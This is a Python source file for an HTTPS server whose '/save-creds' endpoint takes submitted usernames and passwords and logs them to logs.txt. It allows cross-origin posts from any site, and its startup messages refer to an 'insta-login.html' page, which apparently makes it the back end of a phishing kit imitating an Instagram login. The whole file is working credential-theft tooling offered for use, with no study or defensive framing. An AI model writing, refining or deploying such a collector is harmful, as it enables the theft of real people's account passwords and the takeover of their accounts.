import http.server
import ssl
import socket
import json
import time
import os

HOST = "0.0.0.0"
PORT = 8543


class CORSRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/save-creds':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data)

                # Create logs.txt and save credentials
                with open('logs.txt', 'a') as f:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] Username: {data['username']} | Password: {data['password']}\n")
                    f.flush()  # Ensure immediate write

                print(f"✅ Saved to logs.txt: {data['username']}")

                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(b'{"status": "saved"}')
            except Exception as e:
                print(f"❌ Error: {e}")
                self.send_response(500)
                self.end_headers()
            return

        super().do_POST()

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()


# Port check
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.bind((HOST, PORT))
    sock.close()
    print(f"✅ Port {PORT} available")
except OSError:
    print(f"❌ Port {PORT} in use")
    exit(1)

# SSL + Server setup
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain("cert.pem", "key.pem")

httpd = http.server.HTTPServer((HOST, PORT), CORSRequestHandler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print(f"🚀 HTTPS server: https://localhost:{PORT}")
print("📄 Save HTML as 'insta-login.html'")
print("💾 Login → creates 'logs.txt'")
print("🛑 Ctrl+C to stop")
httpd.serve_forever()
